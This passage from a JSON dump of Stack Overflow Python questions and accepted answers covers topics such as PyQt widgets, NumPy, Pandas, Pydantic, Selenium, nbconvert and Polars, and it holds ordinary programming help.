str):\n                self.addItem(item)\n            else:\n                self.addItem(*item)\n\n    def addItem(self, text, background=None):\n        self.insertItem(len(self.items), text, background)\n\n    def insertItem(self, index, text, background=None):\n        label = QLabel(text)\n        if background is None:\n            background = self.palette().window().color()\n            background.setAlpha(0)\n        else:\n            background = QColor(background)\n\n        # human eyes perceive \"brightness\" in different ways, let's compute\n        # that value in order to decide a color that has sufficient contrast\n        # with the background; see https://photo.stackexchange.com/q/10412\n        r, g, b, a = background.getRgbF()\n        brightness = r * .3 + g * .59 + b * .11\n        foreground = 'black' if brightness >= .5 else 'white'\n\n        label.setStyleSheet('color: {}; background: {};'.format(\n            foreground, background.name(background.HexArgb)))\n\n        layout = self.layout()\n        if index < len(self.items):\n            i = 0\n            for _label, _spacer, _ in self.items:\n                if i == index:\n                    i += 1\n                layout.insertWidget(i * 2, _label)\n                layout.insertWidget(i * 2 + 1, _spacer)\n                i += 1\n\n        layout.insertWidget(index * 2, label)\n        spacer = QWidget(objectName='menuArrow')\n        layout.insertWidget(index * 2 + 1, spacer)\n        self.items.insert(index, (label, spacer, background))\n        self.updateItems()\n\n    def removeItem(self, index):\n        label, spacer, background = self.items.pop(index)\n        label.deleteLater()\n        spacer.deleteLater()\n        layout = self.layout()\n        for i, (label, spacer, _) in enumerate(self.items):\n            layout.insertWidget(i * 2, label)\n            layout.insertWidget(i * 2 + 1, spacer)\n        self.updateItems()\n        self.updateGeometry()\n\n    def updateItems(self):\n        if not self.items:\n            return\n\n        size = self.fontMetrics().height()\n        if self.vMargin < 0:\n            vSize = size * 2\n        else:\n            vSize = size + self.vMargin * 2\n        spacing = vSize / 2\n        self.setMinimumHeight(vSize)\n        if self.hMargin >= 0:\n            labelMargin = self.hMargin * 2\n        else:\n            labelMargin = size // 2\n\n        it = iter(self.items)\n        prevBackground = prevSpacer = None\n        while True:\n            try:\n                label, spacer, background = next(it)\n                label.setContentsMargins(labelMargin, 0, labelMargin, 0)\n                spacer.setFixedWidth(spacing)\n\n            except StopIteration:\n                background = QColor()\n                break\n\n            finally:\n                if prevBackground:\n                    if background.isValid():\n                        cssBackground = background.name(QColor.HexArgb)\n                    else:\n                        cssBackground = 'none'\n                    if prevBackground.alpha():\n                        prevBackground = prevBackground.name(QColor.HexArgb)\n                    else:\n                        mid = QColor(prevBackground)\n                        mid.setAlphaF(.5)\n                        prevBackground = '''\n                            qlineargradient(x1:0, y1:0, x2:1, y2:0,\n                            stop:0 {}, stop:1 {})\n                        '''.format(\n                            prevBackground.name(QColor.HexArgb), \n                            mid.name(QColor.HexArgb), \n                            )\n                    prevSpacer.setStyleSheet('''\n                        ArrowMenu > .QWidget#menuArrow {{\n                            background: transparent;\n                            border-top: {size}px solid {background};\n                            border-bottom: {size}px solid {background};\n                            border-left: {spacing}px solid {prevBackground};\n                        }}\n                    '''.format(\n                            size=self.height() // 2, \n                            spacing=spacing, \n                            prevBackground=prevBackground, \n                            background=cssBackground\n                    ))\n\n                prevBackground = background\n                prevSpacer = spacer\n\n    def resizeEvent(self, event):\n        self.updateItems()\n\n\nif __name__ == '__main__':\n    import sys\n    app = QApplication(sys.argv)\n    items = (\n            ('Python', 'green'), \n            ('Will delete', 'chocolate'), \n            ('PyQt5', 'red'), \n            ('Java', 'blue'), \n            ('ASP.Net', 'yellow'), \n        )\n    ex = ArrowMenu(items)\n    ex.show()\n    QTimer.singleShot(2000, lambda: ex.addItem('New item', 'aqua'))\n    QTimer.singleShot(5000, lambda: ex.removeItem(1))\n    sys.exit(app.exec_())\n\nAnd here is the result:\n\n"
}
{
    "Id": 72604922,
    "PostTypeId": 1,
    "Title": "How to convert Python dataclass to dictionary of string literal?",
    "Body": "Given a dataclass like below:\nclass MessageHeader(BaseModel):\n    message_id: uuid.UUID\n\n    def dict(self, **kwargs):\n        return json.loads(self.json())\n\nI would like to get a dictionary of string literal when I call dict on MessageHeader\nThe desired outcome of dictionary is like below:\n{'message_id': '383b0bfc-743e-4738-8361-27e6a0753b5a'}\n\nI want to avoid using 3rd party library like pydantic & I do not want to use json.loads(self.json()) as there are extra round trips\nIs there any better way to convert a dataclass to a dictionary with string literal like above?\n",
    "AcceptedAnswerId": 72605423,
    "AcceptedAnswer": "You can use dataclasses.asdict:\nfrom dataclasses import dataclass, asdict\n\nclass MessageHeader(BaseModel):\n    message_id: uuid.UUID\n\n    def dict(self):\n        return {k: str(v) for k, v in asdict(self).items()}\n\nIf you're sure that your class only has string values, you can skip the dictionary comprehension entirely:\nclass MessageHeader(BaseModel):\n    message_id: uuid.UUID\n\n    dict = asdict\n\n"
}
{
    "Id": 73548604,
    "PostTypeId": 1,
    "Title": "Create 2D Matrix of ascending integers in diagonal/triangle-like order with Numpy",
    "Body": "How do I create a matrix of ascending integers that are arrayed like this example of N=6?\n1  3  6\n2  5  0 \n4  0  0\n\nHere another example for N=13:\n1  3  6  10 0\n2  5  9  13 0\n4  8  12 0  0\n7  11 0  0  0\n10 0  0  0  0\n\nAlso, the solution should perform well for large N values.\nMy code\nimport numpy as np\nN = 13\narray_dimension = 5\nx = 0\ny = 1\nz = np.zeros((array_dimension,array_dimension))\nz[0][0] = 1\nfor i in range(2, N+1):\n    z[y][x] = i\n    if y == 0:\n        y = (x + 1)\n        x = 0\n    else:\n        x += 1\n        y -= 1\nprint(z)\n\n[[ 1.  3.  6. 10.  0.]\n [ 2.  5.  9.  0.  0.]\n [ 4.  8. 13.  0.  0.]\n [ 7. 12.  0.  0.  0.]\n [11.  0.  0.  0.  0.]]\n\nworks, but there must be a more efficient way. Most likely via Numpy, but I cannot find a solution.\n",
    "AcceptedAnswerId": 73555372,
    "AcceptedAnswer": "The assignment can be completed in one step by simply transforming the index of the lower triangle:\ndef fill_diagonal(n):\n    assert n > 0\n    m = int((2 * n - 1.75) ** 0.5 + 0.5)\n    '''n >= ((1 + (m - 1)) * (m - 1)) / 2 + 1\n    => 2n - 2 >= m ** 2 - m\n    => 2n - 7 / 4 >= (m - 1 / 2) ** 2\n    => (2n - 7 / 4) ** (1 / 2) + 1 / 2 >= m for n > 0\n    => m = floor((2n - 7 / 4) ** (1 / 2) + 1 / 2)\n    or n <= ((1 + m) * m) / 2\n    => (2n + 1 / 4) ** (1 / 2) - 1 / 2  0\n    => m = ceil((2n + 1 / 4) ** (1 / 2) - 1 / 2)\n    '''\n    i, j = np.tril_indices(m)\n    i -= j\n    ret = np.zeros((m, m), int)\n    ret[i[:n], j[:n]] = np.arange(1, n + 1)\n    return ret\n\nTest:\n>>> for i in range(1, 16):\n...     print(repr(fill_diagonal(i)), end='\\n\\n')\n...\narray([[1]])\n\narray([[1, 0],\n       [2, 0]])\n\narray([[1, 3],\n       [2, 0]])\n\narray([[1, 3, 0],\n       [2, 0, 0],\n       [4, 0, 0]])\n\narray([[1, 3, 0],\n       [2, 5, 0],\n       [4, 0, 0]])\n\narray([[1, 3, 6],\n       [2, 5, 0],\n       [4, 0, 0]])\n\narray([[1, 3, 6, 0],\n       [2, 5, 0, 0],\n       [4, 0, 0, 0],\n       [7, 0, 0, 0]])\n\narray([[1, 3, 6, 0],\n       [2, 5, 0, 0],\n       [4, 8, 0, 0],\n       [7, 0, 0, 0]])\n\narray([[1, 3, 6, 0],\n       [2, 5, 9, 0],\n       [4, 8, 0, 0],\n       [7, 0, 0, 0]])\n\narray([[ 1,  3,  6, 10],\n       [ 2,  5,  9,  0],\n       [ 4,  8,  0,  0],\n       [ 7,  0,  0,  0]])\n\narray([[ 1,  3,  6, 10,  0],\n       [ 2,  5,  9,  0,  0],\n       [ 4,  8,  0,  0,  0],\n       [ 7,  0,  0,  0,  0],\n       [11,  0,  0,  0,  0]])\n\narray([[ 1,  3,  6, 10,  0],\n       [ 2,  5,  9,  0,  0],\n       [ 4,  8,  0,  0,  0],\n       [ 7, 12,  0,  0,  0],\n       [11,  0,  0,  0,  0]])\n\narray([[ 1,  3,  6, 10,  0],\n       [ 2,  5,  9,  0,  0],\n       [ 4,  8, 13,  0,  0],\n       [ 7, 12,  0,  0,  0],\n       [11,  0,  0,  0,  0]])\n\narray([[ 1,  3,  6, 10,  0],\n       [ 2,  5,  9, 14,  0],\n       [ 4,  8, 13,  0,  0],\n       [ 7, 12,  0,  0,  0],\n       [11,  0,  0,  0,  0]])\n\narray([[ 1,  3,  6, 10, 15],\n       [ 2,  5,  9, 14,  0],\n       [ 4,  8, 13,  0,  0],\n       [ 7, 12,  0,  0,  0],\n       [11,  0,  0,  0,  0]])\n\nFor the case of large n, the performance is about 10 to 20 times that of the loop solution:\n%timeit fill_diagonal(10 ** 5)\n1.63 ms \u00b1 94.5 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 1,000 loops each)\n%timeit fill_diagonal_loop(10 ** 5)    # OP's solution\n25.1 ms \u00b1 218 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 10 loops each)\n\n"
}
{
    "Id": 73561079,
    "PostTypeId": 1,
    "Title": "Yet another combinations with conditions question",
    "Body": "I want to efficiently generate pairs of elements from two lists equal to their Cartesian product with some elements omitted. The elements in each list are unique.\nThe code below does exactly what's needed but I'm looking to optimize it perhaps by replacing the loop.\nSee the comments in the code for details.\nAny advice would be appreciated.\nfrom itertools import product\nfrom pprint import pprint as pp\n\ndef pairs(list1, list2):\n    \"\"\" Return all combinations (x,y) from list1 and list2 except:\n          1. Omit combinations (x,y) where x==y \"\"\"\n    tuples = filter(lambda t: t[0] != t[1], product(list1,list2))\n\n    \"\"\"   2. Include only one of the combinations (x,y) and (y,x) \"\"\"\n    result = []\n    for t in tuples:\n        if not (t[1], t[0]) in result:\n            result.append(t)\n    return result\n\nlist1 = ['A', 'B', 'C']\nlist2 = ['A', 'D', 'E']\npp(pairs(list1, list1))  #  Test a list with itself\npp(pairs(list1, list2))  #  Test two lists with some common elements\n\nOutput\n[('A', 'B'), ('A', 'C'), ('B', 'C')]\n[('A', 'D'),\n ('A', 'E'),\n ('B', 'A'),\n ('B', 'D'),\n ('B', 'E'),\n ('C', 'A'),\n ('C', 'D'),\n ('C', 'E')]\n\n",
    "AcceptedAnswerId": 73575445,
    "AcceptedAnswer": "About 5-6 times faster than the fastest in your answer's benchmark. I build sets of values that appear in both lists or just one, and combine them appropriately without further filtering.\nfrom itertools import product, combinations\n\ndef pairs(list1, list2):\n    a = {*list1}\n    b = {*list2}\n    ab = a & b\n    return [\n        *product(a, b-a),\n        *product(a-b, ab),\n        *combinations(ab, 2)\n    ]\n\nYou could also make it an iterator (because unlike previous solutions, I don't need to store the already produced pairs to filter further ones):\nfrom itertools import product, combinations, chain\n\ndef pairs(list1, list2):\n    a = {*list1}\n    b = {*list2}\n    ab = a & b\n    return chain(\n        product(a, b-a),\n        product(a-b, ab),\n        combinations(ab, 2)\n    )\n\n"
}
{
    "Id": 73137036,
    "PostTypeId": 1,
    "Title": "\"Expected type\" warning from changing dictionary value from None type to str type within a function (Pycharm IDE)",
    "Body": "I have a dictionary for which the key \"name\" is initialized to None (as this be easily used in if name: blocks) if a name is read in it is then assigned to name.\nAll of this works fine but Pycharm throws a warning when \"name\" is changed due to the change in type. While this isn't the end of the world it's a pain for debugging (and could be a pain for maintaining the code). Does anyone know if there is a way either to provide something akin to a type hint to the dictionary or failing that to tell Pycharm the change of type is intended?\ncode replicating issue:\nfrom copy import deepcopy\n\ntest = {\n    \"name\": None,\n    \"other_variables\": \"Something\"\n}\n\n\ndef read_info():\n    test_2 = deepcopy(test)\n    test_2[\"name\"] = \"this is the name\"  # Pycharm shows warning\n    return test_2[\"name\"]\n\nideal solution:\nfrom copy import deepcopy\n\ntest = {\n    \"name\": None type=str,\n    \"other_variables\": \"Something\"\n}\n\n\ndef read_info():\n    test_2 = deepcopy(test)\n    test_2[\"name\"] = \"this is the name\"  # no warning\n    return test_2[\"name\"]\n\nNote:\nI know that setting the default value to \"\" would behave the same but a) it's handy having it print out \"None\" if name is printed before assignment and b) I find it slightly more readable to have None instead of \"\".\nNote_2:\nI am unaware why (it may be a bug or intended for some reason I don't understand) but Pycharm only gives a wanrning if the code shown above is found within a function. i.e. replacing the read_info() function with the lines:\ntest_2 = deepcopy(test)\ntest_2[\"name\"] = \"this is the name\"  # Pycharm shows warning\n\nDoes not give a warning\n",
    "AcceptedAnswerId": 73137424,
    "AcceptedAnswer": "Type hinting that dictionary with dict[str, None | str] (Python 3.10+, older versions need to use typing.Dict[str, typing.Optional[str]]) seems to fix this:\nfrom copy import deepcopy\n\ntest: dict[str, None | str] = {\n    \"name\": None,\n    \"other_variables\": \"Something\"\n}\n\n\ndef read_info():\n    test_2 = deepcopy(test)\n    test_2[\"name\"] = \"this is the name\"  # no warning\n    return test_2[\"name\"]\n\nAs noticed by @Tomerikoo simply type hinting as dict also works (this should work on all? Python versions that support type hints too):\ntest: dict = {\n    \"name\": None,\n    \"other_variables\": \"Something\"\n}\n\n"
}
{
    "Id": 72249268,
    "PostTypeId": 1,
    "Title": "Pandas drop rows lower then others in all colums",
    "Body": "I have a dataframe with a lot of rows with numerical columns, such as:\n\n\n\n\nA\nB\nC\nD\n\n\n\n\n12\n7\n1\n0\n\n\n7\n1\n2\n0\n\n\n1\n1\n1\n1\n\n\n2\n2\n0\n0\n\n\n\n\nI need to reduce the size of the dataframe by removing those rows that has another row with all values bigger.\nIn the previous example i need to remove the last row because the first row has all values bigger (in case of dubplicate rows i need to keep one of them).\nAnd return This:\n\n\n\n\nA\nB\nC\nD\n\n\n\n\n12\n7\n1\n0\n\n\n7\n1\n2\n0\n\n\n1\n1\n1\n1\n\n\n\n\nMy faster solution are the folowing:\n    def complete_reduction(df, columns):\n        def _single_reduction(row):\n            df[\"check\"] = True\n            for col in columns:\n                df[\"check\"] = df[\"check\"] & (df[col] >= row[col])\n            drop_index.append(df[\"check\"].sum() == 1)\n        df = df.drop_duplicates(subset=columns)\n        drop_index = []\n        df.apply(lambda x: _single_reduction(x), axis=1)\n        df = df[numpy.array(drop_index).astype(bool)]\n        return df\n\nAny better ideas?\n\nUpdate:\nA new solution has been found here\nhttps://stackoverflow.com/a/68528943/11327160\nbut i hope for somethings faster.\n",
    "AcceptedAnswerId": 72368866,
    "AcceptedAnswer": "An more memory-efficient and faster solution than the one proposed so far is to use Numba. There is no need to create huge temporary array with Numba. Moreover, it is easy to write a parallel implementation that makes use of all CPU cores. Here is the implementation:\nimport numba as nb\n\n@nb.njit\ndef is_dominated(arr, k):\n    n, m = arr.shape\n    for i in range(n):\n        if i != k:\n            dominated = True\n            for j in range(m):\n                if arr[i, j] < arr[k, j]:\n                    dominated = False\n            if dominated:\n                return True\n    return False\n\n# Precompile the function to native code for the most common types\n@nb.njit(['(i4[:,::1],)', '(i8[:,::1],)'], parallel=True, cache=True)\ndef dominated_rows(arr):\n    n, m = arr.shape\n    toRemove = np.empty(n, dtype=np.bool_)\n    for i in nb.prange(n):\n        toRemove[i] = is_dominated(arr, i)\n    return toRemove\n\n# Special case\ndf2 = df.drop_duplicates()\n\n# Main computation\nresult = df2[~dominated_rows(np.ascontiguousarray(df.values))]\n\n\nBenchmark\nThe input test is two random dataframes of shape 20000x5 and 5000x100 containing small integers (ie. [0;100[). Tests have been done on a (6-core) i5-9600KF processor with 16 GiB of RAM on Windows. The version of @BingWang is the updated one of the 2022-05-24. Here are performance results of the proposed approaches so far:\nDataframe with shape 5000x100\n - Initial code:   114_340 ms\n - BENY:             2_716 ms  (consume few GiB of RAM)\n - Bing Wang:        2_619 ms\n - Numba:              303 ms  <----\n\nDataframe with shape 20000x5\n - Initial code:    (too long)\n - BENY:             8.775 ms  (consume few GiB of RAM)\n - Bing Wang:          578 ms\n - Numba:               21 ms  <----\n\nThis solution is respectively about 9 to 28 times faster than the fastest one (of @BingWang). It also has the benefit of consuming far less memory. Indeed, the @BENY implementation consume few GiB of RAM while this one (and the one of @BingWang) only consumes no more than few MiB for this used-case. The speed gain over the @BingWang implementation is due to the early stop, parallelism and the native execution.\nOne can see that this Numba implementation and the one of @BingWang are quite efficient when the number of column is small. This makes sense for the @BingWang since the complexity should be O(N(logN)^(d-2)) where d is the number of columns. As for Numba, it is significantly faster because most rows are dominated on the second random dataset causing the early stop to be very effective in practice. I think the @BingWang algorithm might be faster when most rows are not dominated. However, this case should be very uncommon on dataframes with few columns and a lot of rows (at least, clearly on uniformly random ones).\n"
}
{
    "Id": 72610552,
    "PostTypeId": 1,
    "Title": "\"Most Replayed\" Data of Youtube Video via API",
    "Body": "Is there any way to extract the \"Most Replayed\" (aka Video Activity Graph) Data from a Youtube video via API?\nWhat I'm referring to:\n\n",
    "AcceptedAnswerId": 72624653,
    "AcceptedAnswer": "One more time YouTube Data API v3 doesn't provide a basic feature.\nI recommend you to try out my open-source YouTube operational API. Indeed by fetching https://yt.lemnoslife.com/videos?part=mostReplayed&id=VIDEO_ID, you will get the most replayed graph values you are looking for in item[\"mostReplayed\"][\"heatMarkers\"][\"heatMarkerRenderer\"][\"heatMarkerIntensityScoreNormalized\"].\nWith the video id XiCrniLQGYc you would get:\n{\n    \"kind\": \"youtube#videoListResponse\",\n    \"etag\": \"NotImplemented\",\n    \"items\": [\n        {\n            \"kind\": \"youtube#video\",\n            \"etag\": \"NotImplemented\",\n            \"id\": \"XiCrniLQGYc\",\n            \"mostReplayed\": {\n                \"maxHeightDp\": 40,\n                \"minHeightDp\": 4,\n                \"showHideAnimationDurationMillis\": 200,\n                \"heatMarkers\": [\n                    {\n                        \"heatMarkerRenderer\": {\n                            \"timeRangeStartMillis\": 0,\n                            \"markerDurationMillis\": 2580,\n                            \"heatMarkerIntensityScoreNormalized\": 1\n                        }\n                    },\n                    ...\n                ],\n                \"heatMarkersDecorations\": [\n                    {\n                        \"timedMarkerDecorationRenderer\": {\n                            \"visibleTimeRangeStartMillis\": 0,\n                            \"visibleTimeRangeEndMillis\": 7740,\n                            \"decorationTimeMillis\": 2580,\n                            \"label\": {\n                                \"runs\": [\n                                    {\n                                        \"text\": \"Most replayed\"\n                                    }\n                                ]\n                            },\n                            \"icon\": \"AUTO_AWESOME\",\n                            \"trackingParams\": \"CC0Q38YIGGQiEwiFxcqD7-P9AhX8V08EHcIFCg8=\"\n                        }\n                    }\n                ]\n            }\n        }\n    ]\n}\n\n"
}
{
    "Id": 73155924,
    "PostTypeId": 1,
    "Title": "Inheritance/subclassing issue in Pydantic",
    "Body": "I came across a code snippet for declaring Pydantic Models. The inheritance used there has me confused.\nclass RecipeBase(BaseModel):\n  label: str\n  source: str\n  url: HttpUrl\n\n\nclass RecipeCreate(RecipeBase):\n  label: str\n  source: str\n  url: HttpUrl\n  submitter_id: int\n\n\nclass RecipeUpdate(RecipeBase):\n  label: str\n\nI am not sure what's the benefit of inheriting from RecipeBase in the RecipeCreate and RecipeUpdate class. The part that has me confused is that after inheritance also, why does one has to re-declare label, source, and URL, which are already part of the  RecipeBase class in the  RecipeCreate class?\n",
    "AcceptedAnswerId": 73159535,
    "AcceptedAnswer": "I\u2019d say it is an oversight from the tutorial. There is no benefit and only causes confusion. Typically, Base is used for all overlapping fields, and they are only overloaded when they change type (for example, XyzBase has name: str whereas XyzCreate has name: str|None because it doesn\u2019t has to be provided when updating an instance.\nThe tutorial is doing a bad job explaining why the setup is as it is.\n"
}
{
    "Id": 73199376,
    "PostTypeId": 1,
    "Title": "RequestsDependencyWarning: urllib3 (1.26.11) or chardet (3.0.4) doesn't match a supported version error using Selenium and ChromeDriverManager",
    "Body": "I have this script to acess my internet modem and reboot the device, but stop to work some weeks ago. Here my code:\nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.options import Options\nfrom selenium.webdriver.chrome.service import Service\nfrom webdriver_manager.chrome import ChromeDriverManager\nservice = Service(executable_path=ChromeDriverManager().install())\ndriver = webdriver.Chrome(service=service)\nfrom selenium.webdriver.common.by import By\n\nchrome_options = Options()\nchrome_options.add_argument('--headless')\nchrome_options.add_argument('--no-sandbox')\nchrome_options.add_argument('--disable-dev-shm-usage')\n\ndriver = webdriver.Chrome(ChromeDriverManager().install(),options=chrome_options)\n\ndriver.get('http://192.168.15.1/me_configuracao_avancada.asp',)\nuser = driver.find_element(By.ID, \"txtUser\")\nuser.send_keys(\"support\")\nbtnLogin = driver.find_element(By.ID, \"btnLogin\")\nbtnLogin.click()\ndriver.get('http://192.168.15.1/reboot.asp',)\nreboot = driver.find_element(By.ID, \"btnReboot\")\nreboot.click()\nprint(\"Modem Reiniciado!\")\n\nnow when i run, this error messages return:\n/usr/lib/python3/dist-packages/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.11) or chardet (3.0.4) doesn't match a supported version!\n  warnings.warn(\"urllib3 ({}) or chardet ({}) doesn't match a supported \"\nTraceback (most recent call last):\n  File \"modem.py\", line 7, in \n    driver = webdriver.Chrome(service=service)\n  File \"/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/chrome/webdriver.py\", line 69, in __init__\n    super().__init__(DesiredCapabilities.CHROME['browserName'], \"goog\",\n  File \"/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/chromium/webdriver.py\", line 92, in __init__\n    super().__init__(\n  File \"/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/remote/webdriver.py\", line 277, in __init__\n    self.start_session(capabilities, browser_profile)\n  File \"/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/remote/webdriver.py\", line 370, in start_session\n    response = self.execute(Command.NEW_SESSION, parameters)\n  File \"/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/remote/webdriver.py\", line 435, in execute\n    self.error_handler.check_response(response)\n  File \"/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/remote/errorhandler.py\", line 247, in check_response\n    raise exception_class(message, screen, stacktrace)\nselenium.common.exceptions.WebDriverException: Message: unknown error: Chrome failed to start: exited abnormally.\n  (unknown error: DevToolsActivePort file doesn't exist)\n  (The process started from chrome location /usr/bin/google-chrome is no longer running, so ChromeDriver is assuming that Chrome has crashed.)\nStacktrace:\n#0 0x561e346d9cd3 \n#1 0x561e344e1968 \n#2 0x561e3450625c \n#3 0x561e345018fa \n#4 0x561e3453c94a \n#5 0x561e34536aa3 \n#6 0x561e3450c3fa \n#7 0x561e3450d555 \n#8 0x561e347212bd \n#9 0x561e34725418 \n#10 0x561e3470b36e \n#11 0x561e34726078 \n#12 0x561e346ffbb0 \n#13 0x561e34742d58 \n#14 0x561e34742ed8 \n#15 0x561e3475ccfd \n#16 0x7fc22f8b9609 \n\nSome weeks ago this code run without any problems, but now i'm stuck\nI'm using Google Chrome 103.0.5060.134 and ChromeDriver 103.0.5060.134.\n",
    "AcceptedAnswerId": 73199422,
    "AcceptedAnswer": "This error message...\n/usr/lib/python3/dist-packages/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.11) or chardet (3.0.4) doesn't match a supported version!\n  warnings.warn(\"urllib3 ({}) or chardet ({}) doesn't match a supported \"\n\n...implies that the requests module is backdated hence not in sync and needs an update.\n\nSolution\nYou can update the requests module using either of the following commands:\npip3 install requests\n\nor\npip3 install --upgrade requests\n\n"
}
{
    "Id": 70552618,
    "PostTypeId": 1,
    "Title": "VScode fails to export Jupyter notebook to HTML - 'jupyter-nbconvert` not found",
    "Body": "I keep on getting error message:\nAvailable subcommands: 1.0.0\nJupyter command `jupyter-nbconvert` not found.\n\nI've tried to reinstall nbconvert using pip to no use. I've also tried the tip from this thread with installing pip install jupyter in vscode terminal but it shows that \"Requirement already satisfied\"\nVSCode fails to export jupyter notebook to html\nI've also tried to manually edit jupyter settings.json file to the following:\n\"python.pythonPath\": \"C:\\\\Users\\\\XYZ\\\\AppData\\\\Local\\\\Packages\\\\PythonSoftwareFoundation.Python.3.9_qbz5n2kfra8p0\\\\LocalCache\\\\local-packages\\\\Python39\\\\Scripts\"\n\nI've python 3.9 installed via windows store.\nAny tip on what might be the issue for vscode doesn't want to export the notebook?\n",
    "AcceptedAnswerId": 72369322,
    "AcceptedAnswer": "Unsure exactly what fixed the issue but heres a summary.\n\nUpdated to python 3.10\nInstalled pandoc and miktex\nPowershell reinstall nbconvert\n\n\nReceived warning that nbconvert script file is installed in a location not in Path.\nCopied said location to System Properties - Envionment Variables - Path\n\n\nRestart and install all miktex package on the go\n\nPDF export and HTML export seems to work as intended now.\n"
}
{
    "Id": 73203318,
    "PostTypeId": 1,
    "Title": "How to transform Spark dataframe to Polars dataframe?",
    "Body": "I wonder how i can transform Spark dataframe to Polars dataframe.\nLet's say i have this code on PySpark:\ndf = spark.sql('''select * from tmp''')\n\nI can easily transform it to pandas dataframe using .toPandas.\nIs there something similar in polars, as I need to get a polars dataframe for further processing?\n",
    "AcceptedAnswerId": 73205690,
    "AcceptedAnswer": "Context\nPyspark uses arrow to convert to pandas. Polars is an abstraction over arrow memory. So we can hijack the API that spark uses internally to create the arrow data and use that to create the polars DataFrame.\nTLDR\nGiven an spark context we can write:\nimport pyarrow as pa\nimport polars as pl\n\nsql_context = SQLContext(spark)\n\ndata = [('James',[1, 2]),]\nspark_df = sql_context.createDataFrame(data=data, schema = [\"name\",\"properties\"])\n\ndf = pl.from_arrow(pa.Table.from_batches(spark_df._collect_as_arrow()))\n\nprint(df)\n\nshape: (1, 2)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 name  \u2506 properties \u2502\n\u2502 ---   \u2506 ---        \u2502\n\u2502 str   \u2506 list[i64]  \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 James \u2506 [1, 2]     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSerialization steps\nThis will actually be faster than the toPandas provided by spark itself, because it saves an extra copy.\ntoPandas() will lead to this serialization/copy step:\nspark-memory -> arrow-memory -> pandas-memory\nWith the query provided we have:\nspark-memory -> arrow/polars-memory\n"
}
{
    "Id": 73206810,
    "PostTypeId": 1,
    "Title": "Faker Python generating chinese/pinyin names",
    "Body": "I am trying to generate random chinese names using Faker (Python), but it generates the names in chinese characters instead of pinyin.\nI found this :\n\nand it show that it generates them in pinyin, while when I try the same code, it gives me only chinese characters.\nhow to get the pinyin ??\n",
    "AcceptedAnswerId": 73206894,
    "AcceptedAnswer": "fake.romanized_name() worked for me.\nI got lucky by looking through dir(fake). Doesn't seem to have a method for pinyin address that I can see...\n"
}
{
    "Id": 73641835,
    "PostTypeId": 1,
    "Title": "Unnesting event parameters in JSON format within a Pandas dataframe",
    "Body": "I have a dataset that looks like the one below.  It is relational, but has a dimension called event_params which is a JSON object of data related to the event_name in the respective row.\nimport pandas as pd\n\na_df = pd.DataFrame(data={\n    'date_time': ['2021-01-03 15:12:42', '2021-01-03 15:12:46', '2021-01-03 15:13:01'\n                  , '2021-01-03 15:13:12', '2021-01-03 15:13:13', '2021-01-03 15:13:15'\n                  , '2021-01-04 03:29:01', '2021-01-04 18:15:14', '2021-01-04 18:16:01'],\n    'user_id': ['dhj13h', 'dhj13h', 'dhj13h', 'dhj13h', 'dhj13h', 'dhj13h', '38nr10', '38nr10', '38nr10'],\n    'account_id': ['181d9k', '181d9k', '181d9k', '181d9k', '181d9k', '181d9k', '56sf15', '56sf15', '56sf15'],\n    'event_name': ['button_click', 'screen_view', 'close_view', 'button_click', 'exit_app', 'uninstall_app'\n                   , 'install_app', 'exit_app', 'uninstall_app'],\n    'event_params': ['{\\'button_id\\': \\'shop_screen\\', \\'button_container\\': \\'main_screen\\', \\'button_label_text\\': \\'Enter Shop\\'}',\n                     '{\\'screen_id\\': \\'shop_main_page\\', \\'screen_controller\\': \\'main_view_controller\\', \\'screen_title\\': \\'Main Menu\\'}',\n                     '{\\'screen_id\\': \\'shop_main_page\\'}',\n                     '{\\'button_id\\': \\'back_to_main_menu\\', \\'button_container\\': \\'shop_screen\\', \\'button_label_text\\': \\'Exit Shop\\'}',\n                     '{}',\n                     '{}',\n                     '{\\'utm_campaign\\': \\'null\\', \\'utm_source\\': \\'null\\'}',\n                     '{}',\n                     '{}']\n    })\n\nI am looking for approaches on how to handle this sort of data.  My initial approach is with pandas, but I'm open to other methods.\nMy ideal end state would be to examine each relationships with respect to each user.  In the current form, I have to compare the dicts/JSON blobs sitting in event_params to determine the context behind an event.\nI've tried using explode() to expand out the event_params column.  My thinking is the best sort of approach would be to turn event_params into a relational format, where each parameter is an extra row of the dataframe with respect to it's preceding values (in other words, while maintaining the date_time, user_id and event_name that it was related too initially).\nMy explode approach didn't work well,\na_df['event_params'] = a_df['event_params'].apply(eval)\nexploded_df = a_df.explode('event_params')\n\nThe output of that was:\ndate_time, user_id, account_id, event_name, event_params\n2021-01-03 15:12:42,dhj13h,181d9k,button_click,button_id\n2021-01-03 15:12:42,dhj13h,181d9k,button_click,button_container\n\nIt has kind of worked, but it stripped the value fields.  Ideally I'd like to maintain those value fields as well.\n",
    "AcceptedAnswerId": 73641899,
